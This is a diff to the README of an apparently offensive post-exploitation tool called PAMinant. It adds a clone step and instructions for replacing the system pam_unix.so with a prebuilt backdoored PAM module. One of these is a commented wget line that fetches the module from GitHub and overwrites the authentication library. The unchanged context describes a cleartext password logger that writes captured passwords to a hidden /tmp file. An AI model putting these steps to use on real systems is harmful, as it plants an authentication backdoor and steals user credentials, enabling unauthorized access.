@@ -5,6 +5,13 @@ Tested on:
 
 ---
 
+# 0] Clone repo
+
+```bash
+git clone https://github.com/innxrmxst/PAMinant.git
+cd PAMinant
+```
+
 # 1] Installing PAM clear text password logger
 
 Useful for collection and possible password reuse checks against other assets if cracking /etc/shadow is not an option :)
@@ -33,6 +40,15 @@ localuser@WORK-ubuntu-dev:~$ sudo cat /tmp/.service_temp_data
 ---
 
 # 2] Installing PAM backdoor
+
+For PAM 1.5.3 in use, module can be installed:
+
+```
+#wget https://raw.githubusercontent.com/innxrmxst/PAMinant/refs/heads/main/linux-pam-backdoor/backdoored153.so -O /lib/x86_64-linux-gnu/security/pam_unix.so
+mv linux-pam-backdoor/backdoored153.so /lib/x86_64-linux-gnu/security/pam_unix.so
+```
+
+Or build and install it from scratch:
 
 ```bash
 sudo apt install -y autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc docbook-xsl docbook-xml xsltproc xmlto git -y
